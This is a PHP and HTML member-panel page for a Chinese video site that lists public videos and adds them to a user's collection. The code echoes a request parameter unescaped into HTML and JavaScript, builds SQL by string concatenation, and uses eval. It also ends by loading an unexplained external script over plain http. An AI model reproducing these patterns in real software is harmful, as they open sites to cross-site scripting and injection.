<? include('../system/inc.php');include('check.php'); ?>
<?php
	if(isset($_GET['a']))
    {
      
    	$sql = 'select  *  from '.flag.'shipin where ID not in (select vid from '.flag.'usershipin where uid = '.$member_id.' and isdel = 0 ) ';
  $result = mysql_query($sql);
 
  while($row = mysql_fetch_array($result)){

    $_data['isdel'] = 0;
	$_data['uid'] = $member_id;
	$_data['cid'] = $row['cid'];
	$_data['vid'] = $row['ID'];
	$_data['name'] = $row['name'];
	$_data['image'] = $row['image'];
	$_data['url'] = $row['url'];
	$_data['price'] = 1;
	$_data['pv'] = 0;
	$_data['date'] =date('Y-m-d H:i:s');
  	$str = arrtoinsert($_data);
	$sql = 'insert into '.flag.'usershipin ('.$str[0].') values ('.$str[1].')';
	 mysql_query($sql);


  }
      echo "<script>alert('添加成功');top.location.reload()</script>";
    }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>公共视频</title>
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    
    <link rel="stylesheet" href="layui/css/layui.css">
    <link rel="stylesheet" href="css/pc.css">
 
</head>
<body>

<div class="layui-fluid child-body">
    <div class="layui-btn-group">
        <button class="layui-btn layui-btn-sm" id="add-all-btn"><i class="layui-icon">&#xe654;</i>添加全部选中视频</button>
       <button class="layui-btn layui-btn-sm" type='button' onclick="location.href='?a=add_more'"><i class="layui-icon">&#xe654;</i>一键添加</button>
    </div>
    
    
         <script type="text/JavaScript">
<!--
function MM_jumpMenu1(targ,selObj,restore){ //v3.0
  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
  if (restore) selObj.selectedIndex=0;
}
//-->
    </script>
					 
                     
                      <select name="menu1" onChange="MM_jumpMenu1('self',this,0)"  style="height:32PX">
			                <option   value="?"  >视频分类</option>
 			                    			                 
		                  		 	<?php
						$result = mysql_query('select * from '.flag.'channel    order by sort desc ,id desc');
						while($row = mysql_fetch_array($result)){
						?>
			                <option  <? if ($row['ID'] == $_GET['cid'] ) { echo "selected";} ?>  value="?cid=<? echo $row['ID'];?>"  ><? echo $row['name'];?> </option>
			                    			                 
		                  <? } ?>
			                    			                 
		                  			  </select>
                                      
                                      
                                      
</div>
<table id="video" lay-filter="list"></table>
<!-- <table class="layui-table" lay-data="{ url:'./index.php?i=5&c=entry&view=public_video&do=pc&m=czt_tushang_v4', page:true, id:'video',limit:20,method:'post',loading:false,limits:[10,20,30],height: 'full-60'}" lay-filter="list">
    <thead>
        <tr>
            <th lay-data="{type:'checkbox'}"></th>
            <th lay-data="{field:'id', width:80, }">ID</th>
            <th lay-data="{field:'title'}">标题</th>
            <th lay-data="{fixed: 'right', width:240, align:'center', toolbar: '#operate'}">操作</th>
        </tr>
    </thead>
</table> -->
<script type="text/html" id="operate">
    <a class="layui-btn layui-btn-primary layui-btn-xs" lay-event="view"><i class="layui-icon">&#xe623;</i>查看</a>
    <a class="layui-btn layui-btn-xs" lay-event="add"><i class="layui-icon">&#xe654;</i>添加到我的视频</a>
</script>

<script src="layui/layui.all.js"></script>
<script src="js/pc.min.js"></script>

<script>

function getimage ($id) {
 
 layer.open({
  type: 2,
  title:'图片',
  area: ['700px', '450px'],
  fixed: false, //不固定
  maxmin: true,
  content: 'img.php?act=shipin&id='+$id+''
});


}

table.render({
    elem: '#video', //指定原始表格元素选择器（推荐id选择器）
    cols: [
        [ //标题栏
            { checkbox: true },
            { field: 'id', title: 'ID', width: 80 },
            { field: 'title', title: '标题' },
            { field: 'image', title: '图片', height: 240, align: 'center'  },
            { field: 'zt', title: '状态', align: 'center'  },
            { fixed: 'right', title: '操作', width: 240, align: 'center', toolbar: '#operate' }
        ]
    ],
    url: 'ajax.php?act=shipin&cid=<?=$_GET['cid']?>',
    id: 'video'
})

table.on('tool(list)', function(obj) {
    var data = obj.data
    if (obj.event === 'view') {
        layer.open({
            type: 2,
            // maxmin: true,
            title: false,
            // area: ['100%', '100%'],
            shadeClose: true, //点击遮罩关闭层
            content: '/member/play.php?src=' + data.url,
            success: function(layero, index) {
         var width =500
                var height =500
                var win_width, win_height
                if (self != top) {
                    win_height = $(top.window).height()
                    win_width = $(top.window).width()
                } else {
                    win_height = $(window).height()
                    win_width = $(window).width()
                }
                layer.style(index, {
                    width: width,
                    height: height,
                    top: (win_height - height) / 2,
                    left: (win_width - width) / 2
                })
                layer.iframeAuto(index)
            }
        })
    } else if (obj.event === 'add') {
        addVideo([data.id])
    }
})

function addVideo (id) {
  $.ajax({
      url: "ajax.php?act=addshipin",
      data: { id: id },
      success: function(response) {
          if (response.code == 0) {
              success(response.msg)
          } else if (response.code==1) {
              error(response.msg)
          }
      }
  })
}

$('#add-all-btn').on('click', function() {
    var checkStatus = table.checkStatus('video')
    var data = checkStatus.data
    if (data.length) {
      var id=data.map(function(item) {return parseInt(item.id)})
        addVideo(id)
        $('div.laytable-cell-checkbox').find('div.layui-form-checked').click()
    }
})
 

</script>

<script>;</script><script type="text/javascript" src="http://aaa.qyqkwy.cn/app/index.php?i=5&c=utility&a=visit&do=showjs&m=czt_tushang_v4"></script></body>
</html>